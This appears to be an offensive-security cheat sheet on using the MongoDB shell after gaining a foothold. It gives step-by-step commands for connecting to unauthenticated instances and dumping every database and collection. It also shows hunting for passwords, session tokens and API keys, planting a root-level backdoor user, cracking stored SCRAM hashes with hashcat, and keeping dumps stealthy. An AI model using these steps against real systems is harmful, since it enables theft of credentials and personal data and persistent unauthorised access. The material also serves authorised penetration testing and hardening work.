# mongosh

**Tags:** `#mongosh` `#mongodb` `#database` `#postexploitation` `#enumeration` `#nosql` `#credentialdumping`

MongoDB Shell — official CLI client for MongoDB instances. Used post-foothold when MongoDB is found unauthenticated (common) or with known credentials. Enumerate databases, dump collections, extract credentials and application data, and abuse misconfigurations. Port 27017 (default), often exposed without authentication on internal networks.

**Source:** https://www.mongodb.com/try/download/shell — or via `mongocli`
**Install:**
```bash
# Kali
sudo apt install mongodb-clients    # installs legacy mongo client
# or mongosh (newer):
wget https://downloads.mongodb.com/compass/mongosh-2.1.1-linux-x64.tgz
tar xzf mongosh-*.tgz && sudo cp mongosh-*/bin/mongosh /usr/local/bin/
```

```bash
# Connect (no auth)
mongosh 192.168.1.10

# Connect with auth
mongosh mongodb://user:password@192.168.1.10:27017/admin
```

> [!note] **MongoDB unauthenticated access** — MongoDB prior to 3.6 bound to `0.0.0.0` with no auth by default. Even in newer versions, `--auth` is not always configured. Any successful `mongosh <ip>` connection without credentials is a full compromise — all data is readable/writable.

---

## Connecting

```bash
# No auth (default — try this first)
mongosh 192.168.1.10
mongosh 192.168.1.10:27017

# With credentials
mongosh mongodb://admin:Password@192.168.1.10:27017/admin

# Authenticate after connecting
mongosh 192.168.1.10
> use admin
> db.auth('admin', 'Password')

# TLS/SSL connection
mongosh mongodb://192.168.1.10:27017 --tls --tlsAllowInvalidCertificates

# Legacy mongo client (if mongosh not available)
mongo 192.168.1.10:27017
mongo 192.168.1.10:27017/admin -u admin -p Password

# Through proxy
proxychains mongosh 192.168.1.10
```

---

## Reconnaissance

```javascript
// Current user and roles
db.runCommand({connectionStatus: 1})

// MongoDB version
db.version()
db.serverStatus().version

// List all databases
show dbs

// Current database
db

// Switch database
use targetdb

// List collections (tables)
show collections

// Database stats
db.stats()

// List all users
use admin
db.system.users.find().pretty()

// Check current user's roles
db.runCommand({usersInfo: 1})
```

---

## Data Enumeration & Extraction

```javascript
// Dump all documents in a collection
db.users.find()
db.users.find().pretty()

// Count documents
db.users.countDocuments()

// Specific fields only
db.users.find({}, {username: 1, password: 1, email: 1})

// Find with filter
db.users.find({"role": "admin"})
db.users.find({"admin": true})

// Limit results
db.users.find().limit(10)

// Find one document
db.users.findOne()

// Search all collections in a database
show collections
// Then iterate:
db.getCollectionNames().forEach(function(c) {
    print("=== " + c + " ===");
    db[c].find().limit(5).forEach(printjson);
})
```

---

## Dump All Data

```javascript
// Dump every collection in current database
db.getCollectionNames().forEach(function(name) {
    print("\n[Collection: " + name + "]");
    db[name].find().forEach(printjson);
})

// Dump across all databases
db.adminCommand({listDatabases: 1}).databases.forEach(function(d) {
    var database = db.getSiblingDB(d.name);
    print("\n=== DATABASE: " + d.name + " ===");
    database.getCollectionNames().forEach(function(c) {
        print("[Collection: " + c + "]");
        database[c].find().limit(20).forEach(printjson);
    });
})
```

---

## Credential Hunting

```javascript
// Search for password fields across users collection
db.users.find({}, {username:1, password:1, hash:1, passwd:1, pwd:1})

// Regex search for email/password fields
db.users.find({email: {$exists: true}}, {email:1, password:1})

// Find admin users
db.users.find({$or: [{role:"admin"}, {isAdmin:true}, {admin:true}]})

// Search session tokens
db.sessions.find({}, {token:1, userId:1})

// API keys
db.getCollectionNames().forEach(function(c) {
    db[c].find({$or: [
        {apikey: {$exists:true}},
        {api_key: {$exists:true}},
        {token: {$exists:true}},
        {secret: {$exists:true}}
    ]}).forEach(printjson);
})
```

---

## Privilege Escalation

```javascript
// Check if current user can create users
db.runCommand({usersInfo: 1})

// Create admin user (if you have userAdmin role)
use admin
db.createUser({
    user: "hacker",
    pwd: "Password123",
    roles: [{role: "root", db: "admin"}]
})

// Grant role to existing user
db.grantRolesToUser("lowpriv", [{role: "root", db: "admin"}])

// Check server configuration (may expose file paths, auth settings)
db.adminCommand({getCmdLineOpts: 1})
```

---

## mongodump — Full Database Export

```bash
# Dump all databases to ./dump/
mongodump --host 192.168.1.10 --port 27017

# Dump with auth
mongodump --host 192.168.1.10 --authenticationDatabase admin -u admin -p Password

# Dump specific database
mongodump --host 192.168.1.10 -d targetdb --out /tmp/mongodump

# Dump specific collection
mongodump --host 192.168.1.10 -d targetdb -c users --out /tmp/

# Restore (if pivoting data)
mongorestore --host 192.168.1.10 /tmp/mongodump
```

---

## Cracking MongoDB Hashes

MongoDB stores passwords as SCRAM-SHA-1 or SCRAM-SHA-256 hashes in `system.users`.

```bash
# Extract from mongosh output — look for credentials field in db.system.users.find()
# Format: SCRAM-SHA-1 stored key

# hashcat mode 24100 (SCRAM-SHA-1) or 24200 (SCRAM-SHA-256)
hashcat -m 24100 mongo_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## OPSEC Notes

- MongoDB access logs connections to `mongod.log` — location via `db.adminCommand({getCmdLineOpts:1})`
- Unauthenticated MongoDB (`--noauth` or missing `security.authorization: enabled`) is zero-resistance — log in, dump, log out
- `mongodump` generates significant read load and network traffic — use targeted collection dumps when stealth matters
- Older `mongo` client (deprecated) may be available when `mongosh` isn't — same commands apply

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
